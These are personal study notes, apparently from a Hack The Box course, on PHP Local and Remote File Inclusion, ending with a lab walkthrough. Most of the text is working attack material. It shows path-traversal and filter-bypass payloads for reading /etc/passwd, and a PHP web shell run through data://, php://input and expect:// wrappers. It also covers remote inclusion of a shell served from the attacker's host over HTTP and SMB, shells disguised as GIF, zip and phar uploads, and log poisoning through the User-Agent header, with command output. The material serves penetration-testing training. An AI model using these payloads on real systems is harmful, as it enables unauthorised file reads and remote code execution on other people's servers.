Generally we need to look where we can inject an LFI payload in order to exploit that vulnerability. Sometimes, there are like static pages that load dynamic content using a GET parameter, like `?language=`. In that case, if we are lucky, it could be vulnerable to LFI (ex: `http://<IP>:<PORT>/index.php?language=en.php`) where index php is the static page and the dynamic part is `en.php` loaded by `?language`. In the cheasheet you can find some of the PHP functions (and other languages) that are vulnerable to some of the types of LFI. The cheatsheet is pretty much straight forward.

# LFI (Local File Inclusion)
A basic LFI looks like this:
```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
OR
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
OR
http://<SERVER_IP>:<PORT>/index.php?language=/../../../../etc/passwd
```

# Basic Bypass
In case the LFI payloads above doesn't work, there could be some filtering in the back-end.
One of them could be the `Non-recursive Path Traversal Filter`, which is good because it's "Non-Recursive". Basically this filter 'filters' our "../" characters in "", which does prevent LFI. The problem with that filter is that we can add another "../" in the same directory, being like "....//". This will bypass this simple filter: in case the filter is "Recursive", this technique doesn't work. An example would be:
```
http://<SERVER_IP>:<PORT>/index.php?language=....//....//....//....//etc/passwd
```
There are other bypasses, like:
```
http://<SERVER_IP>: 
<PORT>/index.php?language=....////....////....////....////etc/passwd
OR
http://<SERVER_IP>:<PORT>/index.php?language=..././..././..././..././etc/passwd
OR
http://<SERVER_IP>:<PORT>/index.php?language=....\/...\/....\/....\/etc/passwd
OR (valid for every1 above:)
http://<SERVER_IP>:<PORT>/index.php?language=/....//....//....//....//etc/passwd
# We just added the '/' prefix before the LFI payload
```

Another technique we can do for bypassing filters is URL encode the LFI payload, for example
```
--> ../../../../etc/passwd
would be
--> ..%2F..%2F..%2F..%2Fetc%2Fpasswd
OR (You can also encode the (..), but they are allowed in URL.)
--> %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```

Another thing is "Approved Paths". With this filter basically it uses regular expression to check if the file is being included in a specific path (ex: 'languages'). To bypass this filter, first we need to find what is that directory (by fuzzing or checking existing forms), oncer we find it we can access that path and then use path traversal to go back in the root directory like this:
```
http://<SERVER_IP>:<PORT>/index.php?language=./languages/../../../../etc/passwd
```

Finally, one way to filter access to some types of file is by appending the `.php` extension. To bypass this, we can use the "Null Bytes" (deprecated, this works only with PHP version below 5.5) by just adding `%00` ad the end of the request. Basically everything else after these null bytes is not elaborated (like comments in SQL). Another way is to 'fill' the size of a string in 32-bit systems, which is 4096 characters (or bytes). Also in order to work, we need to start the path with a `non existing directory`. An example of this would be:
```
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

The whole 4096 character in the end would serve to "truncate" the .php extension at the end.

# PHP Filters
There are few PHP filters. The one we will be using is a compression filter which is `convert.base64-encode`. The first step would be to fuzz PHP pages. Our goal is to find pages and try to retrieve them using the filter we talked before.

```shell-session
Poiint@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

We need to use this filter because if we display a php file, sometimes it will not be displayed in the screen, so by encoding in base64 we can get their data in this way. Once we got a list of files and want to get them, we can get them using this filter:

```url
php://filter/read=convert.base64-encode/resource=config
#NOTE: you could need to add '.php' at the end of the files depending on the server settings
```

Once encoded, we can take the base64 string and decode it. 
NB: check also the source code!

# PHP wrappers (For RCE)

## Data
Can be used if the `allow_url_include` is `On` in PHP configuration file. These config files are located in `/etc/php/X.Y/apache2/php.ini` for apache or `/etc/php/X.Y/fpm/php.ini` for nginx where `X.Y` is the PHP version (ex: `7.3`). We can use the PHP filter above in order to get this `php.ini` file and read throught it. 

```shell-session
Poiint@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Since this is `On`, we can now write a simple php shell like this:

```shell-session
Poiint@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```


Now we can execute this php shell using the `data` wrapper:

```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```

This can be done also with `cURL`.
## Input
This wrapper is similar to the `data` one. In the `data` wrapper data is sent throught a GET request, with the `input` wrapper, it's sent via POST request, so we can use `Burpsuite` or `cURL`:

```shell-session
Poiint@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

In order to use this attack, we again need that `allow_url_include` is `On`.
## Expect
(I couldn't make it work in the modules, but who knows in the future?...)
To use this wrapper we need the `expect` extension settled in the PHP configuration file (like we did before). If we see that `extension=expect` it means we can use this wrapper like this:
```shell-session
Poiint@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```



# RFI (Remote File Inclusion)

Check the cheatsheet table. You will see that in the PHP functions, there is a column that indicates `Remote URL`. If a fucntion has that column checked, it means that it can be used for RFI. 
Again, we need to check for `allor_url_include = On`, but this is not 100% reliable. The best way to check if a webserver is vulnerable to RFI is to include a local URL into the URL:

```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

This is basically calling the webpage itself. Be carefull that can cause a recursive inclusion and cause a DoS so maybe it's better to call some other file. If this is succesfull we can call something that we can own and get RFI over the webserver.
First of all we can type a single php shell:
```shell-session
Poiint@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Now  we can start an python3 http server: (ports 80 and 443 are best bets).

```shell-session
Poiint@htb[/htb]$ sudo python3 -m http.server 80
```

And now we can get RFI throught our php shell like this:

```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>/shell.php&cmd=id
```

We can perform the same technique with ftp using `sudo python -m pyftpdlib -p 21` and `ftp://`. Both attacks can be also be executed using `cURL`. On windows sistems we can do that also using `SMB` starting a smb server like this: 

```shell-session
Poiint@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
```

And by using a UNC path (windows backwards slash), we can make this attack:

```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```



# LFI and File Uploads
Check again the cheatsheet. Only PHP functions that have the `execute` column checked can be used for this attack. The idea is not to bypass upload filters (this will be done in the next module), but to upload a file that can be used to obtain LFI.
What we can do is create a simple PHP shell like we did before, but we need to make two changes:
- Add `GIF8` at the start of the file (Magic bytes)
- Save the file in the `.gif` format

```shell-session
Poiint@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Now we can try to upload that file. Once we did that (and we got some type of response like `File succesfully uploaded`), we need to find the directory where our file has been uploaded. We can do that by looking in our profile (like for example we uploaded a profile image) or something else. If we cannot find it, we can fuzz directories in order to find them. Once we located the directory and the file, we can do that:

```shell-session
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

Of course we can also add  `../` in order to access the directory succesfully.

We can also do that thing using `zip` files using the `zip://` wrapper . The procedure is very similar, so i will only paste the commands: 

```shell-session
Poiint@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php 
#This will create a file named shell.jpg which is a ZIP file
```
Once we upload this file, we can do that: 

```
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

Remember this is a ZIP file and not a really a JPG file. As you can see we need to call the file itself `shell.jpg` and then we need to specify the "sub-file" (which is `shell.php`) with the `#`, which will be URL encoded.

Finally, we can do that attack using the `phar://` wrapper. The process is a bit harder than before. First of all, we need to create a `shell.php` like this:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Next, we need to compile this file into a `phar` file: 

```shell-session
Poiint@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Now we will be having a file named `shell.jpg`. We can again upload this file, and then execute the attack with this command:

```
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

Similar to the zip file, we need to specify the file itself `shell.jpg` and its "sub-file", which is `/shell.txt` then appending the command `&cmd=id`

# Log Poisoning
Check the cheatsheet, only PHP functions that have `execute` column cheked.
The first technique would be using `PHPSESSID` cookies. These cookies are saved in `/var/lib/php/sessions/` on Linux and in `C:\Windows\Temp\` on Windows. The files would have some type of prefix, like `sess_` and then our cookie, like `el4ukv0kqbvoirg7nkp4dncpk3`, so the final file name would be: `/sess_el4ukv0kqbvoirg7nkp4dncpk3`.
What we can try to do is manipulate these file's data, which probably contains our user details, user preferences ecc... In this case (by accessing it) we can see that the cookie saves our language preference in which page, like `page: 6"en.php|preference: 7"english"`.
Now what we can try to do is input whatever string in the `?language=` parameter to see if it's actually written into file. In case it's succesfull (we can check the file again), we can inject a URL encoded php shell like this: 

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

and by adding the `&cmd=<command>`. Once we did that, we can check the cookie file again. It should have that \<command\> executed.

Another technique would be to check for `server logs`. These have name such as `access.log`, `error.log` ecc. Sometimes, in these files, like `access.log`, it contains the user's `User-Agent`. This means that if we can manipulate the  `User-Agent` by writing a php shell while sending the request, we could obtain RCE.
By default, `Apache` logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while `Nginx` logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.
We can access the `access.log` file in the `/var/log/apache2/` (for example) and see if the `User-Agent` it's actually inside of each request. If so, we can use `Burpsuite` to change that parameter in a php shell:

```shell-session
User-Agent: <?php system($_GET["cmd"]); ?>
```

or we can use `cURL`: 

```shell-session
Poiint@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

Once done, we can access that `access.log` file again by adding a PHP get parameter command:

```shell-session
http://index.php?language=/var/log/apache2/access.log&cmd=id
```

Then we look for the `access.log` lines to see where the command has been executed succesfully
NB: it's not for sure that the latest log is the one that has been executing our commands, so check all the latest logs.

Some extra techniques would be to do something similar with the `/proc/self/environ` or `/proc/self/fd/N` files which also contains the `User-Agent` header.
Other similar log poisoning we may able to read and inject would be
- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`
If so, we can check for what parameter we have the ability to manipulate and try to input a php shell again. If we are succesfull we can access these files by appending a PHP command like we did before.
# Automated Scanning
Sometimes we need to fuzz the parameter in order to know what our vector could be. We can do that by fuzzing with `ffuf`: [[12a. AttackingWebApplicationFFuF_notes]].
Below are some of the fuzzing commands:

For FUZZING PARAMETERS
```shell-session
Poiint@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

For FUZZING LFI PAYLOADS [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
```shell-session
Poiint@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

For FUZZING SERVER WEBROOTS ([wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt))
```shell-session
Poiint@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

FOR FUZZING SERVER LOGS/CONFIGURATIONS [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
```shell-session
Poiint@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```



# LFI Prevention
For prevention check course material

# LFI Skills Assessment

At first we are displayed in a basic web page. We can see in the top level of the webpage that there's some links like 'about us', 'contact' ecc... By clicking in one of them we would have something like that `index.php?page=about` so the first thing i tried is to run ffuf with the `jhaddix` LFI payloads like this `index.php?page=FUZZ`. This attempt was not succesfull, and doesn't matter in which page i did that. The weird thing is that i had like two list of responses, where they were diffent in size. But both of them were not actually executing the LFI payloads. I tried every type of LFI bypass and it did not work, same for PHP wrappers and in general RCE techniques. So what was left is PHP filters. Indeed, we were able to use a php filter to read the default `index.php` page. By reading the lines, we could see that we had a part of code that was referring to another page: `ilf_admin/index.php`. So i accessed this page and it was like a "Logs viewer". This page was indeed vulnerable to LFI (in the url we could run LFI payloads, the structure was very similar to the index page we saw at first). Since the display was viewing the LOGS, the first thought would be to do LOGS poisoning.
The first thing we need to know is where these logs file are stored, for that we can fuzz using the server logs/configuration wordslist in the [[17a. LocalFileInclusion_notes#Automated Scanning]]. Once we find it (it was in `/var/log/nginx/access.log` if i remember well), since the logs were showing the `User-Agent`, the first thing we can do is by changing that parameter in a php shell. So we can intercept a request using `Burpsuite`, change the `User-Agent` header, and send the request. We can see in the page that the log was stored succesfully so now we can call that file by appending a command like `id && whoami && ls /` ecc... The flag is located in the root directory so by listing it we can then `cat` the file.